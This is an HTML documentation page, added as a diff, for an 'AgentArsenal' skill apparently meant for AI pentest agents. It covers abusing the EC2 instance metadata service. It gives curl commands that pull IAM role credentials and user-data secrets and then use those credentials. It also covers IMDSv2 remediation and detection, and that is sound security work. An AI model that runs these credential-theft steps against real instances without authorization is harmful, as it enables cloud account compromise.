@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AgentArsenal: ec2-metadata-abuse</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --panel: #161b22;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --yellow: #d29922;
+  --red: #f85149;
+}
+* { box-sizing: border-box; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  margin: 0;
+  line-height: 1.6;
+}
+.wrap { max-width: 1100px; margin: 0 auto; padding: 1.5rem; }
+header.site {
+  border-bottom: 1px solid var(--border);
+  background: var(--panel);
+}
+header.site .wrap { display: flex; align-items: center; gap: 1.5rem; flex-wrap: wrap; }
+header.site h1 { font-size: 1.25rem; margin: 0; }
+header.site h1 a { color: var(--text); text-decoration: none; }
+nav a { color: var(--accent); text-decoration: none; margin-right: 1rem; }
+nav a:hover { text-decoration: underline; }
+table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
+th, td { border: 1px solid var(--border); padding: 0.55rem 0.75rem; text-align: left; vertical-align: top; }
+th { background: var(--panel); }
+tbody tr:hover { background: rgba(88, 166, 255, 0.06); }
+a { color: var(--accent); }
+.muted { color: var(--muted); }
+.badge {
+  display: inline-block;
+  padding: 0.12rem 0.6rem;
+  border-radius: 999px;
+  font-size: 0.8rem;
+  font-weight: 600;
+  white-space: nowrap;
+}
+.badge.green { background: rgba(63, 185, 80, 0.12); color: var(--green); border: 1px solid var(--green); }
+.badge.yellow { background: rgba(210, 153, 34, 0.12); color: var(--yellow); border: 1px solid var(--yellow); }
+.badge.red { background: rgba(248, 81, 73, 0.12); color: var(--red); border: 1px solid var(--red); }
+.badge.gray { background: rgba(139, 148, 158, 0.12); color: var(--muted); border: 1px solid var(--muted); }
+#filter {
+  width: 100%;
+  max-width: 28rem;
+  padding: 0.6rem 0.8rem;
+  margin-top: 1rem;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text);
+  font-size: 1rem;
+}
+pre {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1rem;
+  overflow-x: auto;
+}
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 0.9em; }
+pre code { font-size: 0.85rem; }
+p code, li code, td code {
+  background: rgba(88, 166, 255, 0.1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 0.05rem 0.35rem;
+}
+.meta { display: flex; gap: 0.75rem; flex-wrap: wrap; margin: 1rem 0; align-items: center; }
+.deps { margin: 0.5rem 0; }
+.deps span.kind { color: var(--muted); font-size: 0.85rem; margin-right: 0.4rem; }
+.deps a { margin-right: 0.5rem; }
+h2 { border-bottom: 1px solid var(--border); padding-bottom: 0.4rem; }
+footer { border-top: 1px solid var(--border); margin-top: 2rem; padding: 1rem 0; color: var(--muted); font-size: 0.85rem; }
+.legend { display: flex; gap: 1.5rem; flex-wrap: wrap; margin: 1rem 0; color: var(--muted); font-size: 0.9rem; }
+.legend svg { vertical-align: middle; margin-right: 0.4rem; }
+.graph-note { color: var(--muted); font-size: 0.9rem; }
+</style>
+</head>
+<body>
+<header class="site">
+<div class="wrap">
+<h1><a href="../index.html">AgentArsenal</a></h1>
+<nav>
+<a href="../index.html">Skills</a>
+<a href="../index.html#agents">Agents</a>
+<a href="../index.html#brains">Brains</a>
+<a href="../index.html#playbooks">Playbooks</a>
+<a href="../index.html#decisions">Decisions</a>
+<a href="../graph.html">Dependency graph</a>
+</nav>
+</div>
+</header>
+<main class="wrap">
+<p><a href="../index.html">&larr; All skills</a></p><h2>ec2-metadata-abuse</h2><div class="meta"><span class="badge gray">cloud</span><span class="muted">v1.0.0</span><span class="badge green">stable</span><span class="badge green">95/100</span><span class="muted">verified 2026-10-23</span></div><p>Use when you have code execution or SSRF on an EC2 instance</p><div class="deps"><span class="kind">sub-skill of:</span> <a href="aws-enumeration.html">aws-enumeration</a></div><div class="deps"><span class="kind">requires:</span> <a href="aws-enumeration.html">aws-enumeration</a></div><div class="deps"><span class="kind">extends:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">relates:</span> <a href="cloud-security-basics.html">cloud-security-basics</a> <a href="web-sqli.html">web-sqli</a></div><h2>Tools</h2><table><thead><tr><th>Tool</th><th>Version</th></tr></thead><tbody><tr><td>curl</td><td>8.5</td></tr><tr><td>AWS CLI</td><td>2.15</td></tr><tr><td>Python</td><td>3.12</td></tr></tbody></table><p>The EC2 instance metadata service hands out the instance&#x27;s IAM role credentials to anything that can reach it: SSRF vulnerabilities turn into cloud credential theft through this service. This skill covers assessing metadata exposure on authorized engagements: checking the IMDS version, extracting what the service exposes, and understanding the credential impact. It assumes you already have a request vector (SSRF) or host access; finding the SSRF is the web testing phase&#x27;s job.</p>
+<h2>Quick Workflow</h2>
+<ol>
+<li>Confirm you can reach the metadata service (169.254.169.254).</li>
+<li>Check whether IMDSv1 (no auth) or IMDSv2 (token required) is in use.</li>
+<li>Enumerate what the service exposes: role name, credentials, user</li>
+<p>data.</p>
+<li>Extract the role credentials where the scope allows.</li>
+<li>Assess what the role grants (hand to iam-enumeration).</li>
+<li>Report the IMDS version and exposure as the finding.</li>
+</ol>
+<h2>1. Version check and basic access</h2>
+<pre><code class="language-bash"># IMDSv1: direct access, no token (the vulnerable configuration)
+curl -s --max-time 5 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2&gt;&amp;1 | head -3
+
+# IMDSv2: requires a PUT for a token first (SSRF-safe against naive GET)
+TOKEN=$(curl -s --max-time 5 -X PUT \
+  http://169.254.169.254/latest/api/token \
+  -H &#x27;X-aws-ec2-metadata-token-ttl-seconds: 60&#x27; 2&gt;&amp;1)
+echo &quot;token: ${TOKEN:0:20}...&quot;
+curl -s --max-time 5 -H &quot;X-aws-ec2-metadata-token: $TOKEN&quot; \
+  http://169.254.169.254/latest/meta-data/iam/security-credentials/ | head -3</code></pre>
+<p>IMDSv1 responding is the finding: any SSRF can read it with a simple GET. IMDSv2 with hop limit 1 resists most SSRF; verify the configuration from the instance description, not just the behavior.</p>
+<pre><code class="language-bash"># Check the instance&#x27;s IMDS configuration (with EC2 read access)
+aws ec2 describe-instances --instance-ids i-1234567890abcdef0 \
+  --query &#x27;Reservations[].Instances[].[MetadataOptions.HttpTokens,MetadataOptions.HttpEndpoint]&#x27; \
+  --output text
+# HttpTokens=required means IMDSv2 enforced: good
+# HttpTokens=optional means IMDSv1 allowed: finding</code></pre>
+<h2>2. What the service exposes</h2>
+<pre><code class="language-bash"># With metadata access (on-host or via SSRF):
+# Role name attached to the instance
+curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+# Temporary credentials for the role (valid ~6 hours, auto-rotated)
+curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/&lt;role-name&gt;
+
+# User data: often contains secrets, bootstrap credentials, scripts
+curl -s http://169.254.169.254/latest/user-data | head -30</code></pre>
+<p>User data is the forgotten secret store: bootstrap scripts embed database passwords, API keys, and private keys in plaintext, readable by any process on the host and any SSRF. Review it on every instance you assess.</p>
+<h2>3. Credential use and impact</h2>
+<pre><code class="language-bash"># Use the extracted credentials (scope-approved only)
+export AWS_ACCESS_KEY_ID=&lt;from metadata&gt;
+export AWS_SECRET_ACCESS_KEY=&lt;from metadata&gt;
+export AWS_SESSION_TOKEN=&lt;from metadata&gt;
+aws sts get-caller-identity --output text
+# Hand the session to iam-enumeration for privilege mapping
+
+# Note the credential lifetime: metadata credentials rotate automatically,
+# so exfiltrated keys have a bounded window (still hours, still enough)</code></pre>
+<p>The impact equals the role&#x27;s permissions: a metadata read on an instance with an admin role is full account compromise. That is why the finding is about the IMDS version AND the role&#x27;s privilege together; either alone understates it.</p>
+<h2>Edge cases</h2>
+<ul>
+<li>IMDSv2 is enforced. Naive SSRF fails; the finding becomes the role</li>
+<p>privilege and user-data hygiene, not the metadata version.</p>
+<li>No IAM role attached. The metadata still exposes network and</li>
+<p>identity info, but no credentials; note the good configuration.</p>
+<li>The hop limit blocks container SSRF. IMDSv2 with hop limit 1 stops</li>
+<p>most container-originated SSRF; verify rather than assume.</p>
+<li>SSRF is blind (no response). OOB techniques still extract metadata;</li>
+<p>the exposure exists even when you cannot see the response directly.</p>
+</ul>
+<h2>Escalation</h2>
+<ul>
+<li>Credentials extracted with high privilege: report immediately and</li>
+<p>hand to iam-enumeration; the window is bounded by rotation.</p>
+<li>You need the SSRF fixed, not just reported: the fix is IMDSv2</li>
+<p>enforcement (HttpTokens=required) plus SSRF remediation in the app.</p>
+<li>Fleet-wide review needed: audit HttpTokens across all instances;</li>
+<p>one IMDSv1 instance in a fleet is the attacker&#x27;s target.</p>
+</ul>
+<h2>Detection and defender view</h2>
+<p>Defenders see metadata abuse as credential use from unusual sources: the role&#x27;s keys used outside the instance&#x27;s network, or STS calls with no matching instance activity. GuardDuty flags several of these patterns. Defenses are IMDSv2 enforced fleet-wide, least-privilege instance roles (so stolen credentials grant little), no secrets in user data, and alerting on credential use anomalies.</p>
+<h2>Key references</h2>
+<ul>
+<li>MITRE ATT&amp;CK T1552.005 (Unsecured Credentials: Cloud Instance</li>
+<p>Metadata API).</p>
+<li>CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor).</li>
+<li>AWS documentation: IMDSv2 and instance metadata security.</li>
+</ul>
+</main>
+<footer class="wrap">
+<p>AgentArsenal docs. Generated 2026-10-23.</p>
+</footer>
+</body>
+</html>
